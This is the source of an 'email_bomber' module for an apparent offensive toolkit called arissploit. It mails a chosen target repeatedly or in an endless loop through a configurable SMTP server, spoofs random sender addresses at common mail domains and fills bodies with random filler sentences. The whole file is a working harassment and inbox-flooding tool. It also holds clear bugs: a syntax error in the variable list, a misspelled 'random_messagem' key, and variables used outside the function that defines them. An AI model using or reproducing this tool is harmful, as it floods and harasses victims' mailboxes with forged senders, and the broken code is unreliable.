from core.arissploit import *
from core import colors
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socket
import random
from string import ascii_lowercase

conf = {
	"name": "email_bomber",
	"version": "1.0",
	"shortdesc": "Spam email to target email.",
	"author": "Entynetproject",
	"initdate": "5.4.2016",
	"lastmod": "3.1.2017",
	"apisupport": True
}

# List of the variables
variables = OrderedDict((
	('my_username', ['username', 'Username for login'.]),
	('my_password', ['yourpassword', 'Password for login.']),
	('smtp', ['smtp.server.com', 'SMTP server.']),
	('smtp_port', [587, 'SMTP server port (must be int).']),
	('from_email', ['from@email.com', 'From email.']),
	('to_email', ['target@email.com', 'To email.']),
	('subject', ['hello', 'Subject.']),
	('message', ['hello', 'Message.']),
	('amount', [1, 'Amount of emails (0 = infinite/must be int).']),
	('starttls', [0, 'Use starttls (0 = no/1 =yes).']),
	('login', [0, 'Use login (0 = no/1 = yes).']),
	('random_email', [1, 'Generate random email (0 = no/1 = yes).']),
	('random_message', [1, 'Generate random message (0 = no/1 = yes).']),
))

s_nouns = ["A dude", "My mom", "The king", "Some guy", "A cat with rabies", "A sloth", "Your homie", "This cool guy my gardener met yesterday", "Superman", "Super Mario", "Human", "Robot", "Boy", "Girl"]
p_nouns = ["These dudes", "Both of my moms", "All the kings of the world", "Some guys", "All of a cattery's cats", "The multitude of sloths living under your bed", "Your homies", "Like, these, like, all these people", "Supermen"]
s_verbs = ["eats", "kicks", "gives", "treats", "meets with", "creates", "hacks", "configures", "spies on", "retards", "meows on", "flees from", "tries to automate", "explodes", "writes", "tease"]
p_verbs = ["eat", "kick", "give", "treat", "meet with", "create", "hack", "configure", "spy on", "retard", "meow on", "flee from", "try to automate", "explode"]
infinitives = ["to make a pie.", "for no apparent reason.", "because the sky is green.", "for a disease.", "to be able to make toast explode.", "to know more about archeology.", "because the sky is blue"]

option_notes = colors.yellow+"This module may not work with gmail, yahoo, yandex\n please run your own SMTP!"+colors.end
# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	fromaddr = variables['my_username'][0]
	toaddr = variables['to_email'][0]
	msg = MIMEMultipart()
	msg['From'] = variables['from_email'][0]
	msg['To'] = variables['to_email'][0]
	msg['Subject'] = variables['subject'][0]

	domains = [ "hotmail.com", "gmail.com", "aol.com", "mail.com" , "mail.kz", "yahoo.com"]
	letters = ascii_lowercase[:12]

	body = variables['message'][0]
	msg.attach(MIMEText(body, 'html'))
	try:
		server = smtplib.SMTP(variables['smtp'][0], int(variables['smtp_port'][0]))
	except(ValueError):
		printError("Port number must be int!")
		return ModuleError("Port number must be int!")
	except socket.gaierror:
		printError("Cannot reach SMTP server!")
		return ModuleError("Cannot reach SMTP server!")
	except(ConnectionRefusedError):
		printError("Connection refused!")
		return ModuleError("Connection refused!")
	except(TimeoutError):
		printError("Timeout cannot reach SMTP server!")
		return ModuleError("Timeout cannot reach SMTP server!")
	if int(variables['starttls'][0]) == 1:
		server.starttls()
	if int(variables['login'][0]) == 1:
		server.login(fromaddr, variables['my_password'][0])
	text = msg.as_string()

	if int(variables['amount'][0]) > 0:
		for i in range(0, int(variables['amount'][0])):
				if int(variables['random_email'][0] == 1):
					fakemail = generate_random_email()
					msg['From'] = fakemail[0]
				if int(variables['random_messagem'][0]) == 1:
					list0 = random.choice(s_nouns), random.choice(s_verbs), random.choice(s_nouns).lower() or random.choice(p_nouns).lower(), random.choice(infinitives)
					words = " ".join(list0)
					msg.attach(MIMEText(words, 'html'))
				server.sendmail(fromaddr, toaddr, text)
				printSuccess("email sended")

	if int(variables['amount'][0]) == 0:
		printInfo("Starting infinite loop... Ctrl + C to end.")
		while True:
			if int(variables['random_email'][0]) == 1:
					fakemail = generate_random_email()
					msg['From'] = fakemail[0]
			if int(variables['random_messagem'][0]) == 1:
					list0 = random.choice(s_nouns), random.choice(s_verbs), random.choice(s_nouns).lower() or random.choice(p_nouns).lower(), random.choice(infinitives)
					words = " ".join(list0)
					msg.attach(MIMEText(words, 'html'))
			server.sendmail(fromaddr, toaddr, text)
			printSuccess("Email sended.")
	server.quit()

def get_random_domain(domains):
	return random.choice(domains)

def get_random_name(letters, length):
	return ''.join(random.choice(letters) for i in range(length))

def generate_random_email():
	return [get_random_name(letters, 8) + '@' + get_random_domain(domains) for i in range(1)]
